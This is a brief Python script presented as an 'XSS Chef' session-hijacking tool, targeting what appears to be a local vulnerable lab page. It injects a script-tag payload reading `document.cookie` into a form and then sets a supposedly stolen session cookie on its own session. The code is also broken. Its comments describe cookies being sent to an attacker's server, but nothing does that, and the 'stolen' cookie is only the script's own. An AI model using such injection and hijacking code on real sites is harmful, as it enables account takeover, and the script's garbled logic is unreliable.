import requests

# Welcome to the XSS Chef tool - Session Hijacking Script
# XSS Chef is a tool used for Cross-Site Scripting (XSS) attacks to manipulate sessions

class XSSChefSessionHijacking:
    
    def __init__(self):
        self.target_url = "http://127.0.0.1:81/vulnerabilities/xss_d/"

    def inject_script(self, payload):
        response = s.get(self.target_url)
        payload = {
            "txtName": "<script>" + payload + "</script>",
            "btnPress": "Press%3CBR%3EMe",
        }
        response = s.post(self.target_url, data=payload)
        return response.text

    def steal_session_cookie(self):
        response = s.get(self.target_url)
        # Assuming a known vulnerable script is already loaded and returning to the attacker's controlled server
        # We can extract the session cookies in the response and create a new session with the stolen value
        # Here's a simplified example to demonstrate
        stolen_cookie = response.cookies.get("session_id")
        s.headers.update({'Cookie': f'session_id={stolen_cookie}'})

    def main(self):
        # Example: Perform session hijacking through XSS with a simple alert script
        xss_payload = "alert(document.cookie);"
        self.inject_script(xss_payload)

        # Example: Steal and use the session cookie to hijack the session
        self.steal_session_cookie()

if __name__ == "__main__":
    with requests.Session() as s:
        xss_chef = XSSChefSessionHijacking()
        xss_chef.main()
